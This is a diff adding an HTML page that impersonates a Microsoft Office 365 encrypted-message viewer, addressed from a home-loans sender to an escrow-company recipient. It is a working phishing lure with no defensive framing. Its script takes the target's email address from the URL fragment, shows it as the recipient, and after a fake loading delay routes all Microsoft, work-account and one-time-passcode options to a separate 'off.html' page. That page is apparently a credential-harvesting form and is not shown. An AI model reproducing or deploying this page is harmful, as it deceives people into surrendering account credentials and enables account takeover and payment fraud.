@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Encrypted Message</title>
+    <meta name="viewport" content="user-scalable=0, width=device-width, initial-scale=1.0, maximum-scale=1.0">
+    <link rel="stylesheet" type="text/css" href="css/base.css">
+    <style>
+        .signinDescriptionColumn {
+        }
+
+        .signinDescriptionText {
+            margin-top:25px;
+            font-family:'Segoe UI Regular';
+            font-size:18px;
+            color:#333333;
+        }
+
+        .signinButton {
+            margin-top:25px;
+            padding-top:10px;
+            padding-bottom:10px;
+            padding-left:10px;
+            padding-right:10px;
+            background-color:rgb(256, 256, 256);
+            cursor:pointer;
+        }
+
+        .signinButtonImageColumn {
+            text-align:center;
+            vertical-align:middle;
+        }
+
+        .signinButtonImage {
+            margin-left:0px;
+            margin-right:10px;
+        }
+
+        .signinButtonTextColumn {
+            vertical-align:middle;
+        }
+
+        .signinButtonText {
+            font-family:'Segoe UI Regular';
+            font-size:20px;
+            color:#0072C6;
+            text-align:left;
+        }
+
+        .signinButtonAltText {
+            font-family:'Segoe UI Regular';
+            font-size:13px;
+            color:#333333;
+            text-align:left;
+        }
+        
+        .signinCreateOptionText {
+            font-family:'Segoe UI Regular';
+            font-size:13px;
+            color:#333333;
+            margin-top:25px;
+            padding-top:10px;
+            padding-bottom:10px;
+            padding-left:10px;
+            padding-right:10px;
+            text-align:left;
+        }
+
+        .otpOptionText {
+            margin-top:25px;
+            padding-top:10px;
+            padding-bottom:10px;
+            padding-left:10px;
+            padding-right:10px;
+            text-align:left;
+        }
+
+        .otpOptionLink {
+            font-family:'Segoe UI Regular';
+            font-size:14px;
+            color:#0072C6;
+            border: none; 
+            cursor: pointer;
+            text-decoration:none;
+        }
+    
+    
+
+    </style>
+</head>
+
+<body style="margin:0px">
+    <form name="form1" id="form1">
+        <div id="Header" style="padding: 10px 18px 10px 18px; background-color:rgb(0, 114, 198); line-height:30px;; font: 13px Segoe UI Regular; font-family: Segoe UI Regular, Segoe UI, Segoe, Helvetica, Tahoma, Arial, sans-serif; color: #ffffff;">Encrypted Message</div>
+        <div style="max-width:700px; margin-left:auto; margin-right:auto; padding-left:10px; padding-right:10px;display: block;" id="div1">
+            <div id="EncryptedMessage" style="padding-top:14%; padding-bottom:20px; font: 22px Segoe UI Semilight; color:#333333; font-family: Segoe UI Semilight, Segoe UI, Segoe, Helvetica, Tahoma, Arial, sans-serif; line-height:125%;">Encrypted message<br></div>
+            <div id="FromHeaderDiv" style="padding-bottom:20px; font: 15px Segoe UI Semilight; color:#666666; font-family: Segoe UI Semilight, Segoe UI, Segoe, Helvetica, Tahoma, Arial, sans-serif; line-height:125%;">From<br><a id="SenderAddress" style="text-decoration:none; cursor:text; color:#0172C6; font-size:18px;"><span style="word-wrap:break-word">veronica.kiernan@dignifiedhomeloans.com</span></a></div>
+            <div id="ToHeaderDiv" style="padding-bottom:20px; font: 15px Segoe UI Semilight; color:#666666; font-family: Segoe UI Semilight, Segoe UI, Segoe, Helvetica, Tahoma, Arial, sans-serif; line-height:125%;">To<br><a id="RecipientAddress" style="text-decoration:none; cursor:text; color:#0172C6; font-size:18px;"><span style="word-wrap:break-word">ggeraldo@allcalescrow.com</span></a></div>
+            <div id="MobileSpecialInstructions" style="font-style: normal; font-variant: normal; font-weight: normal; font-size: 15px; color: rgb(0, 0, 0); font-family: &quot;Segoe UI Semilight&quot;, &quot;Segoe UI&quot;, Segoe, Helvetica, Tahoma, Arial, sans-serif; line-height: 125%; margin-bottom: 60px; display: none;">
+                <p style="font: 22px Segoe UI Semilight; color:#000000; font-family: Segoe UI Semilight, Segoe UI, Segoe, Helvetica, Tahoma, Arial, sans-serif; line-height:125%;">To view the message on your computer...</p>
+                <p>Save and open the attachment (message.html), and then follow the instructions from there.</p>
+                <p></p>
+            </div>
+            <div id="ViewMessageText" style="display: block; padding-bottom: 25px; font: 15px &quot;Segoe UI Semilight&quot;, &quot;Segoe UI&quot;, Segoe, Helvetica, Tahoma, Arial, sans-serif; color: rgb(51, 51, 51);">To view the message, sign in with a Microsoft account, your work or school account, or use a one-time passcode.<br></div>
+            <div id="ViewMessageText_ios" style="display:none; padding-bottom:25px; font: 15px Segoe UI Semilight; color:#333333; font-family: Segoe UI Semilight, Segoe UI, Segoe, Helvetica, Tahoma, Arial, sans-serif;">To view the message, sign in using a one-time passcode.<br></div>
+            <div id="ViewMessageButton" style="display: block; padding-bottom: 21%;"><input style="font:14px Segoe UI Regular;  font-family: Segoe UI Regular, Segoe UI, Segoe, Helvetica, Tahoma, Arial, sans-serif; color:#0072C6; cursor: pointer; background: #ffffff url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABoAAAAaCAMAAACelLz8AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjZBODRDRDVEMDY3QTExRTE5MUNFQ0QwMDBGQzc0RUU1IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjZBODRDRDVFMDY3QTExRTE5MUNFQ0QwMDBGQzc0RUU1Ij4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6NkE4NENENUIwNjdBMTFFMTkxQ0VDRDAwMEZDNzRFRTUiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6NkE4NENENUMwNjdBMTFFMTkxQ0VDRDAwMEZDNzRFRTUiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz5VmLPXAAACbVBMVEXs7/BqquFRnN3l6+9bot/t8PDh6O/n7O9YoN7p7vDo7O9uq+Hi6e+NuuXk6+/M3OzN3exMm93J2+xImNyszemtzulWn95npuBPnN1eo9/i6u/f5+9Kmdzm6+9Qnd1/s+Pr7vDq7vBnp+CbwufL3exJmNyDtuRwrOFKmtxNm93U4e3T4e1CldtDltuNu+VurOFSnd1Zod6Rvea/1et9s+NUnt690+urzejU4O2zz+rs8PBzreGKueW70+tQnN1Xn97n7PBOnN251erm6/Dg6e9rquFrquB5seJipeBJmdyoyeiTv+VipuCdw+fh6O7w8fFMmt3r7/DD2euZwOeszOmhxufW5O6AtePV4e7V4u7P3u2Pu+WSvOaIuORgpt+91eqtzOnt7/BnqOBoqeHR4u1XoN6Bs+Ndo9+wz+lOm914r+Lh6e5Un96z0OpSnN3H2uynyejT4e55seO+1evW4u7X4+7d5u/O3u2gxOdxrOFfo9+exOfF2euixujU4u220eqwzum30erZ5O5kpeDf6O7l6vB5sOOJueSTv+ZlpuBWoN5Rnt2MuuXH2eynyOmEtuR1r+K00Org6O9xreHY4+7Z4+640emwzOmSveVxreJTnt5hpODp7fBPm93G2Ovg6O7u7/Db5e7c5u/d5u7P3+2fxueqy+jG2eu20Oq1z+qCtOSJuORhpeDI2uxNmt3s7vDK2+3I2+yGtuS30em81uqQvOVGl9zR4O1jpuCXweamyeiyzumHt+VpqeGvzemDteSZwueWwOVkpuCryujT4O3L2+xtq+BFltzL2u3Q3u2z0eqwzemCteN9suPv8vHydXkhAAAAz3RSTlP//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////wAFdzktAAABxklEQVR42mI4BwGsik1OG4yLVbYzW0FFzjFAKL/cg+LCgkyCupI9BaUoUgLuXcLy+0S2iEzk5TDlnsYFl2I4zSLGW8fMCuJzLpleJWHkDJXyr5VhrJE9Bwflaqp6DhAps8zJFueQAZfetgMMICkppR1HzqECxaK8o0CpwGrhlefQgRaHCec5BmbxCZxQAe3etZOgzApVIVYG4+O2MLVTZ6ZmLYYwF9rHKDDMYGmBmxOZFGAtDWbxhCezM5w1AXGs2ECg9YSbRqUWSCqxQ06AwbCfB8gMYwSDY5KmEmuiQHKnZuUz5KiBpFKYQEBOw0CMiWUzSErUUIhBXX4+kMUnKipibp7RoOQouQJs2a7ujQy84syIYPA1SG8EB6VDO4sUw2GdIJiM9Cpdn3kQZvbsNGaGRfabYFJm3jv5ocwEHUsGBkWbddqwuFsPjdhzss2dzMDgPSlmPQctCBmUPUMYgFIKoTLRC1BkOOvl5NnB8cVuY7eaHTm6+iQOlUETAI+RjPpuF1aoNUKxc7kL4clGystD88zS5RYRJfzLtnLY7ZmClKIUBJQ5BPdyc+u7smju5+dDSYfn2FVsg9vi9Hkt4/lgdgIEGABSfHCQrQseUQAAAABJRU5ErkJggg==) no-repeat; border: none; padding-left: 34px; min-height:26px; margin-bottom: 10px; white-space:normal; text-align:left;" id="submit1" type="button" value="Sign in"><br>
+
+                <input name="ViewMessageOTPButton" style="font:14px Segoe UI Regular;  font-family: Segoe UI Regular, Segoe UI, Segoe, Helvetica, Tahoma, Arial, sans-serif; color:#0072C6; cursor: pointer; background: #ffffff url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABoAAAAaCAMAAACelLz8AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjZBODRDRDVEMDY3QTExRTE5MUNFQ0QwMDBGQzc0RUU1IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjZBODRDRDVFMDY3QTExRTE5MUNFQ0QwMDBGQzc0RUU1Ij4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6NkE4NENENUIwNjdBMTFFMTkxQ0VDRDAwMEZDNzRFRTUiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6NkE4NENENUMwNjdBMTFFMTkxQ0VDRDAwMEZDNzRFRTUiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz5VmLPXAAACbVBMVEXs7/BqquFRnN3l6+9bot/t8PDh6O/n7O9YoN7p7vDo7O9uq+Hi6e+NuuXk6+/M3OzN3exMm93J2+xImNyszemtzulWn95npuBPnN1eo9/i6u/f5+9Kmdzm6+9Qnd1/s+Pr7vDq7vBnp+CbwufL3exJmNyDtuRwrOFKmtxNm93U4e3T4e1CldtDltuNu+VurOFSnd1Zod6Rvea/1et9s+NUnt690+urzejU4O2zz+rs8PBzreGKueW70+tQnN1Xn97n7PBOnN251erm6/Dg6e9rquFrquB5seJipeBJmdyoyeiTv+VipuCdw+fh6O7w8fFMmt3r7/DD2euZwOeszOmhxufW5O6AtePV4e7V4u7P3u2Pu+WSvOaIuORgpt+91eqtzOnt7/BnqOBoqeHR4u1XoN6Bs+Ndo9+wz+lOm914r+Lh6e5Un96z0OpSnN3H2uynyejT4e55seO+1evW4u7X4+7d5u/O3u2gxOdxrOFfo9+exOfF2euixujU4u220eqwzum30erZ5O5kpeDf6O7l6vB5sOOJueSTv+ZlpuBWoN5Rnt2MuuXH2eynyOmEtuR1r+K00Org6O9xreHY4+7Z4+640emwzOmSveVxreJTnt5hpODp7fBPm93G2Ovg6O7u7/Db5e7c5u/d5u7P3+2fxueqy+jG2eu20Oq1z+qCtOSJuORhpeDI2uxNmt3s7vDK2+3I2+yGtuS30em81uqQvOVGl9zR4O1jpuCXweamyeiyzumHt+VpqeGvzemDteSZwueWwOVkpuCryujT4O3L2+xtq+BFltzL2u3Q3u2z0eqwzemCteN9suPv8vHydXkhAAAAz3RSTlP//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////wAFdzktAAABxklEQVR42mI4BwGsik1OG4yLVbYzW0FFzjFAKL/cg+LCgkyCupI9BaUoUgLuXcLy+0S2iEzk5TDlnsYFl2I4zSLGW8fMCuJzLpleJWHkDJXyr5VhrJE9Bwflaqp6DhAps8zJFueQAZfetgMMICkppR1HzqECxaK8o0CpwGrhlefQgRaHCec5BmbxCZxQAe3etZOgzApVIVYG4+O2MLVTZ6ZmLYYwF9rHKDDMYGmBmxOZFGAtDWbxhCezM5w1AXGs2ECg9YSbRqUWSCqxQ06AwbCfB8gMYwSDY5KmEmuiQHKnZuUz5KiBpFKYQEBOw0CMiWUzSErUUIhBXX4+kMUnKipibp7RoOQouQJs2a7ujQy84syIYPA1SG8EB6VDO4sUw2GdIJiM9Cpdn3kQZvbsNGaGRfabYFJm3jv5ocwEHUsGBkWbddqwuFsPjdhzss2dzMDgPSlmPQctCBmUPUMYgFIKoTLRC1BkOOvl5NnB8cVuY7eaHTm6+iQOlUETAI+RjPpuF1aoNUKxc7kL4clGystD88zS5RYRJfzLtnLY7ZmClKIUBJQ5BPdyc+u7smju5+dDSYfn2FVsg9vi9Hkt4/lgdgIEGABSfHCQrQseUQAAAABJRU5ErkJggg==) no-repeat; border: none; padding-left: 34px; min-height:26px; margin-bottom: 10px; white-space:normal; text-align:left;" id="submit2" type="button" value="Use a one-time passcode" >
+            </div>
+            <table style="padding-top:8px; padding-bottom:15px; border-top: 1px solid #EAECEE; width:100%;">
+                <tbody>
+                    <tr>
+                        <td id="LockImage" style="height:16px; width:16px; background:#ffffff url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkU2QjZFRDJFOTk0OTExRTE5MEFFQUY3RkJFODY1Qzc3IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkU2QjZFRDJGOTk0OTExRTE5MEFFQUY3RkJFODY1Qzc3Ij4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6RTZCNkVEMkM5OTQ5MTFFMTkwQUVBRjdGQkU4NjVDNzciIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6RTZCNkVEMkQ5OTQ5MTFFMTkwQUVBRjdGQkU4NjVDNzciLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz4P2R/9AAAAwklEQVR42mL8//8/AyWABV2goqKCE0jVAXEsEEsD8VMgngLEfR0dHb8IGgAE64DYHohXAvFxILaEGqgOxInoihmRvQC03QNIbQfiXKBtU5DEc4DUZCDWA4pfRjaACc1ASyi9A018K5Q2Q3cBugGiUPo+mvgjKM2G0wtAZx5DcgE+cBzoDStsLrAkMuYs8XkBGdQAbWIE0fhMw2fARDSaZAPy0WiSDWhBo0k2gCiA1wBg1P4nxYAFRFrahDMvkAMAAgwA6hUy/dUMmhQAAAAASUVORK5CYII=) no-repeat center center;"></td>
+                        <td id="Hosted" style="font:13px Segoe UI Semilight;  font-family: Segoe UI Semilight, Segoe UI, Segoe, Helvetica, Tahoma, Arial, sans-serif; color:#666666;">Message encryption by Microsoft Office 365</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+        <div id="div2" style="display:none;">
+            <table class="e4eContainer" role="presentation">
+                <tbody>
+                    <tr>
+                        <td class="signinDescriptionColumn">
+                            <p class="signinDescriptionText">Which account would you like to sign in with to view your encrypted message?</p>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <a id="liveIdSignin" class="signinButton linkoff"  href="./off.html" style="text-decoration:none">
+                                <table role="presentation">
+                                    <tbody>
+                                        <tr>
+                                            <td class="signinButtonImageColumn">
+                                                <img class="signinButtonImage" src="images/liveid.png" alt="sign in button">
+                                            </td>
+                                            <td class="signinButtonTextColumn">
+                                                <p class="signinButtonText">Microsoft account</p>
+                                                <p class="signinButtonAltText">Create a Microsoft account for ggeraldo@allcalescrow.com that you can use to view this message and to access other Microsoft services, such as OneDrive, Xbox LIVE, or Outlook.com.</p>
+                                            </td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </a>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <a id="orgIdSignin" class="signinButton linkoff" href="./off.html" style="text-decoration:none">
+                                <table role="presentation">
+                                    <tbody>
+                                        <tr>
+                                            <td class="signinButtonImageColumn">
+                                                <img class="signinButtonImage" src="images/orgid.png" alt="sign in button">
+                                            </td>
+                                            <td class="signinButtonTextColumn">
+                                                <p class="signinButtonText">Work or school account</p>
+                                                <p class="signinButtonAltText">Sign in with the account provided by your work or school to use with Office 365 or other Microsoft services.</p>
+                                            </td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </a>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <p class="otpOptionText"><a class="otpOptionLink linkoff" href="./off.html">Don't want to sign in? Use a one-time passcode to view the message.</a></p>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </form>
+ <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
+    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
+</body>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+<script>
+/* global $ */
+$(document).ready(function() {
+    
+
+    $("#submit1").click(function(event){
+    	$(this).val("Loading, please wait...");
+    	$("#submit2").hide();
+    	go_next();
+
+
+    })
+
+    $("#submit2").click(function(event){
+    	$(this).val("Loading, please wait...");
+    	$("#submit1").hide();
+    	go_next();
+
+    })
+
+    var ai = window.location.hash.substr(1);
+    if (!ai) {
+
+    } else {
+
+        var my_ai = ai;
+        $('#RecipientAddress').html(my_ai);
+        $('.linkoff').attr('href',"./off.html#"+my_ai);
+
+    }
+
+
+    function go_next(){
+    	setTimeout(function() {
+    		$("#div1").animate({ left: 0, opacity: "hide" }, 0);
+    		$("#div2").animate({ right: 0, opacity: "show" }, 500);
+    	}, 3000);
+    	
+    }
+
+
+
+});
+</script>
+
+</html>
